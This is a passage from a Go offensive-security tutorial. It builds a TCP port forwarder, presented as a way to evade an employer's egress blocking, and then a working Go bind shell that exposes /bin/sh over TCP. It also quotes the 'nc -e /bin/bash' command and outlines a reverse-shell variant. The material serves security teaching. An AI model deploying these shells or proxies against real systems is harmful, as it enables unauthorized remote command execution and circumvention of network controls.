
Proxying a TCP Client


Now that you have a solid foundation, you can take what you’ve learned up to this point and create a simple port forwarder to proxy a connection through an intermediary service or host. As mentioned earlier in this chapter, this is useful for trying to circumvent restrictive egress controls or to leverage a system to bypass network segmentation.

Before laying out the code, consider this imaginary but realistic problem: Joe is an underperforming employee who works for ACME Inc. as a business analyst making a handsome salary based on slight exaggerations he included on his resume. (Did he really go to an Ivy League school? Joe, that’s not very ethical.) Joe’s lack of motivation is matched only by his love for cats—so much so that Joe installed cat cameras at home and hosted a site, joescatcam.website, through which he could remotely monitor the dander-filled fluff bags. One problem, though: ACME is onto Joe. They don’t like that he’s streaming his cat cam 24/7 in 4K ultra high-def, using valuable ACME network bandwidth. ACME has even blocked its employees from visiting Joe’s cat cam website.

Joe has an idea. “What if I set up a port-forwarder on an internet-based system I control,” Joe says, “and force the redirection of all traffic from that host to joescatcam.website?” Joe checks at work the following day and confirms he can access his personal website, hosted at the joesproxy.com domain. Joe skips his afternoon meetings, heads to a coffee shop, and quickly codes a solution to his problem. He’ll forward all traffic received at http://joesproxy.com to http://joescatcam.website.

Here’s Joe’s code, which he runs on the joesproxy.com server:

func handle(src net.Conn) { dst, err := net.Dial("tcp", "joescatcam.website:80")❶ if err != nil { log.Fatalln("Unable to connect to our unreachable host") } defer dst.Close() // Run in goroutine to prevent io.Copy from blocking ❷ go func() { // Copy our source's output to the destination if _, err := io.Copy(dst, src)❸; err != nil { log.Fatalln(err) } }() // Copy our destination's output back to our source if _, err := io.Copy(src, dst)❹; err != nil { log.Fatalln(err) } } func main() { // Listen on local port 80 listener, err := net.Listen("tcp", ":80") if err != nil { log.Fatalln("Unable to bind to port") } for { conn, err := listener.Accept() if err != nil { log.Fatalln("Unable to accept connection") } go handle(conn) } }

Start by examining Joe’s handle(net.Conn) function. Joe connects to joescatcam.website ❶ (recall that this unreachable host isn’t directly accessible from Joe’s corporate workstation). Joe then uses Copy(Writer, Reader) two separate times. The first instance ❸ ensures that data from the inbound connection is copied to the joescatcam.website connection. The second instance ❹ ensures that data read from joescatcam.website is written back to the connecting client’s connection. Because Copy(Writer, Reader) is a blocking function, and will continue to block execution until the network connection is closed, Joe wisely wraps his first call to Copy(Writer, Reader) in a new goroutine ❷. This ensures that execution within the handle(net.Conn) function continues, and the second Copy(Writer, Reader) call can be made.

Joe’s proxy listens on port 80 and relays any traffic received from a connection to and from port 80 on joescatcam.website. Joe, that crazy and wasteful man, confirms that he can connect to joescatcam.website via joesproxy.com by connecting with curl:

$ curl -i -X GET http://joesproxy.com HTTP/1.1 200 OK Date: Wed, 25 Nov 2020 19:51:54 GMT Server: Apache/2.4.18 (Ubuntu) Last-Modified: Thu, 27 Jun 2019 15:30:43 GMT ETag: "6d-519594e7f2d25" Accept-Ranges: bytes Content-Length: 109 Vary: Accept-Encoding Content-Type: text/html --snip--

At this point, Joe has done it. He’s living the dream, wasting ACME-sponsored time and network bandwidth while he watches his cats. Today, there will be cats!





Replicating Netcat for Command Execution


In this section, let’s replicate some of Netcat’s more interesting functionality—specifically, its gaping security hole.

Netcat is the TCP/IP Swiss Army knife—essentially, a more flexible, scriptable version of Telnet. It contains a feature that allows stdin and stdout of any arbitrary program to be redirected over TCP, enabling an attacker to, for example, turn a single command execution vulnerability into operating system shell access. Consider the following:

$ nc –lp 13337 –e /bin/bash

This command creates a listening server on port 13337. Any remote client that connects, perhaps via Telnet, would be able to execute arbitrary bash commands—hence the reason this is referred to as a gaping security hole. Netcat allows you to optionally include this feature during program compilation. (For good reason, most Netcat binaries you’ll find on standard Linux builds do not include this feature.) It’s dangerous enough that we’ll show you how to create it in Go!

First, look at Go’s os/exec package. You’ll use that for running operating system commands. This package defines a type, Cmd, that contains necessary methods and properties to run commands and manipulate stdin and stdout. You’ll redirect stdin (a Reader) and stdout (a Writer) to a Conn instance (which is both a Reader and a Writer).

When you receive a new connection, you can use the Command(name string, arg ...string) function from os/exec to create a new Cmd instance. This function takes as parameters the operating system command and any arguments. In this example, hardcode /bin/sh as the command and pass -i as an argument such that you’re in interactive mode, which allows you to manipulate stdin and stdout more reliably:

cmd := exec.Command("/bin/sh", "-i")

This creates an instance of Cmd but doesn’t yet execute the command. You have a couple of options for manipulating stdin and stdout. You could use Copy(Writer, Reader) as discussed previously, or directly assign Reader and Writer to Cmd. Let’s directly assign your Conn object to both cmd.Stdin and cmd.Stdout, like so:

cmd.Stdin = conn cmd.Stdout = conn

With the setup of the command and the streams complete, you run the command by using cmd.Run():

if err := cmd.Run(); err != nil { // Handle error. }

This logic works perfectly fine on Linux systems. However, when tweaking and running the program on a Windows system, running cmd.exe instead of /bin/bash, you’ll find that the connecting client never receives the command output because of some Windows-specific handling of anonymous pipes. Here are two solutions for this problem.

First, you can tweak the code to explicitly force the flushing of stdout to correct this nuance. Instead of assigning Conn directly to cmd.Stdout, you implement a custom Writer that wraps bufio.Writer (a buffered writer) and explicitly calls its Flush method to force the buffer to be flushed. Refer to the “Creating the Echo Server” on page 35 for an exemplary use of bufio.Writer.

Here’s the definition of the custom writer, Flusher:

// Flusher wraps bufio.Writer, explicitly flushing on all writes. type Flusher struct { w *bufio.Writer } // NewFlusher creates a new Flusher from an io.Writer. func NewFlusher(w io.Writer) *Flusher { return &Flusher{ w: bufio.NewWriter(w), } } // Write writes bytes and explicitly flushes buffer. ❶ func (foo *Flusher) Write(b []byte) (int, error) { count, err := foo.w.Write(b)❷ if err != nil { return -1, err } if err := foo.w.Flush()❸; err != nil { return -1, err } return count, err }

The Flusher type implements a Write([]byte) function ❶ that writes ❷ the data to the underlying buffered writer and then flushes ❸ the output.

With the implementation of a custom writer, you can tweak the connection handler to instantiate and use this Flusher custom type for cmd.Stdout:

func handle(conn net.Conn) { // Explicitly calling /bin/sh and using -i for interactive mode // so that we can use it for stdin and stdout. // For Windows use exec.Command("cmd.exe"). cmd := exec.Command("/bin/sh", "-i") // Set stdin to our connection cmd.Stdin = conn // Create a Flusher from the connection to use for stdout. // This ensures stdout is flushed adequately and sent via net.Conn. cmd.Stdout = NewFlusher(conn) // Run the command. if err := cmd.Run(); err != nil { log.Fatalln(err) } }

This solution, while adequate, certainly isn’t elegant. Although working code is more important than elegant code, we’ll use this problem as an opportunity to introduce the io.Pipe() function, Go’s synchronous, in-memory pipe that can be used for connecting Readers and Writers:

func Pipe() (*PipeReader, *PipeWriter)

Using PipeReader and PipeWriter allows you to avoid having to explicitly flush the writer and synchronously connect stdout and the TCP connection. You will, yet again, rewrite the handler function:

func handle(conn net.Conn) { // Explicitly calling /bin/sh and using -i for interactive mode // so that we can use it for stdin and stdout. // For Windows use exec.Command("cmd.exe"). cmd := exec.Command("/bin/sh", "-i") // Set stdin to our connection rp, wp := io.Pipe()❶ cmd.Stdin = conn ❷ cmd.Stdout = wp ❸ go io.Copy(conn, rp) cmd.Run() conn.Close() }

The call to io.Pipe() ❶ creates both a reader and a writer that are synchronously connected—any data written to the writer (wp in this example) will be read by the reader (rp). So, you assign the writer to cmd.Stdout ❷ and then use io.Copy(conn, rp) ❸ to link the PipeReader to the TCP connection. You do this by using a goroutine to prevent the code from blocking. Any standard output from the command gets sent to the writer and then subsequently piped to the reader and out over the TCP connection. How’s that for elegant?

With that, you’ve successfully implemented Netcat’s gaping security hole from the perspective of a TCP listener awaiting a connection. You can use similar logic to implement the feature from the perspective of a connecting client redirecting stdout and stdin of a local binary to a remote listener. The precise details are left to you to determine, but would likely include the following:

Establish a connection to a remote listener via net.Dial(network, address string).



Initialize a Cmd via exec.Command(name string, arg ...string).



Redirect Stdin and Stdout properties to utilize the net.Conn object.



Run the command.





At this point, the listener should receive a connection. Any data sent to the client should be interpreted as stdin on the client, and any data received on the listener should be interpreted as stdout. The full code of this example is available at https://github.com/blackhat-go/bhg/blob/master/ch-2/netcat-exec/main.go.





Summary


Now that you’ve explored practical applications and usage of Go as it relates to networking, I/O, and concurrency, let’s move on to creating usable HTTP clients.
